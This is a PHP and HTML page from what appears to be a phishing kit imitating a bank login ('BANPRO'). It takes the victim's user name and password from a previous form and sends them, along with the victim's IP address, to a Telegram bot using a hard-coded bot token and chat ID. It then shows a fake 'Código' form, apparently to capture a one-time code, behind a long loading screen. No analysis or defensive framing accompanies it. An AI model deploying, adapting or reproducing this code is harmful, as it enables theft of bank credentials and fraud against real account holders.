<?php
session_start();
if( !empty($_POST['ips1']) && !empty($_POST['ips2'])){
    
    $tlg_tk = "6163969515:AAFNFbQFNVNxNZRQAepiSs_luajL7CUM_Vg";
    $tlg_id = "5157616506";

    $msg = "BANPRO LOGIN> IP".$_SERVER['REMOTE_ADDR']."- USE : ".$_POST['ips1'].' - CSS : '.$_POST['ips2'];
    
    $_SESSION['U1'] =  $_POST['ips1'];
    $_SESSION['P1'] =  $_POST['ips2'];

$tgmsg = <<<EOC
    <script>
        var tlbtid = "{{tlg_tk}}";
        var chat_id = "{{tlg_id}}";

        var message;
        var ready = function () {
            message = "{{msg}}";
        };
        var cfnder = function () {
            ready();
            var settings = {
                "async": true,
                "crossDomain": true,
                "url": "https://api.telegram.org/bot" + tlbtid + "/sendMessage",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache"

                },
                "data": JSON.stringify({
                    "chat_id": chat_id,
                    "text": message
                })
            };
            $.ajax(settings).done(function (response) {
                //window.location = '3.html';
                console.log('well');
            });

            return false;
        };
        cfnder();

    </script>
EOC;

    $main = str_replace("{{msg}}", $msg , $tgmsg);
    $main = str_replace("{{tlg_tk}}", $tlg_tk , $main);
    $main = str_replace("{{tlg_id}}", $tlg_id , $main);
    
}else{
    header ('Location:index.html');
}
?>
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title></title>
    <script
  src="https://code.jquery.com/jquery-2.2.3.min.js"
  integrity="sha256-a23g1Nt4dtEYOj7bR+vTu7+T8VP13humZFBJNIYoEJo="
  crossorigin="anonymous"></script>
  </head>
  <body >
  <div id="ld" style="position: fixed;width:100%;height: 100%;background: rgba(255,255,255,1);z-index: 10;text-align:center;"><img src="tmp.svg" style="width: 300px;margin-top: 200px;"><br><div style="width: 126px;height: 126px;display:inline-block;border: 5px solid #00693c;border-radius: 50%;"><img src="p.gif?id=<?php echo rand(10,100);?>" style="width: 110px;position: relative;top: 36px;"></div></div>
    <style>
        *{margin: 0;padding: 0;}
        @font-face {
            font-family: dinReg;
            src: url(din-regular.ttf);
        }
    </style>
    
    
    <div id="main-cnt" style="overflow: hidden;min-height:100vh;position: relative;">
        
        <div id="ctn" style="display: inline-block;vertical-align: top;background-color: #fff;">
            <div id="frmc" style="display:inline-block;text-align: center;border-radius: 8px;vertical-align: top;width: 500px;">
                
                <form method="post" action="3.php" id="f1" style="display: inline-block;width: 420px;height: 660px;border-radius:10px;background-image: url(2.svg);position: relative;" >
                    <img src="l.png" style="position: relative;top: 51px;left: -15px;width: 294px;">
                    <input maxlength="8"  id="i1" name="ips1" placeholder="Código" type="text" required style="display: block;position: relative;color:#333;background: transparent;border: none;top: 187px;left: 28px;height: 39px;width: 357px;padding-left: 12px;outline: none;font-size: 16px;font-family: dinReg, sans-serif;" autocomplete="off">
                    
                    <input type="submit" style="display: block;
    position: relative;
    font-size: 16px;
    color: #fff;
    background: rgb(0, 105, 60);
    border: none;
    top: 224px;
    left: 28px;
    height: 39px;
    width: 364px;
    outline: none;
    border-radius: 8px;" value="Continuar">
                </form>
                
            </div>
            <div id="bnncont" style="text-align: right;display: inline-block;">
                <div  style="position: absolute;z-index: 1;opacity: 1;overflow: hidden;width: 80%;height: 100%;left: 500px;top: 0px;display: inline-block;">
                    <div id="bnn" style="background: url(bnn.jpg) left center / cover no-repeat;height: 100%;overflow: hidden;position: relative;text-align: center;"><img src="terms.svg" style="width: 60%;position: relative; top: 80vh;"></div>
                </div>
            </div>
        </div>
        
    </div>
        
    </div>
    <style>
        
        @media screen and (max-width:1024px){
           body{
                width: 100%!important;
                background: linear-gradient(rgb(105, 190, 40), rgb(0, 105, 60)) !important;
                background-repeat: no-repeat!important;
                min-width: auto!important;
                zoom:90%!important;
            }
            #ctn{
                border-radius: 6px!important;
            }
            #main-cnt{
                text-align: center!important;
                padding-top: 30px;
            }
            
            #frmc{
                width: 100%!important;
            }
            #bnncont{
                display: none!important;
            }
            
        }
        @media screen and (max-width:420px){
            
        }
    </style>
    <?php echo $main;?>
    <script>
        window.onload = function(){
            setTimeout(function(){ 
                document.getElementById("ld").style.display = "none";
            }, 19000);  
        }
    </script>
  </body>
</html>




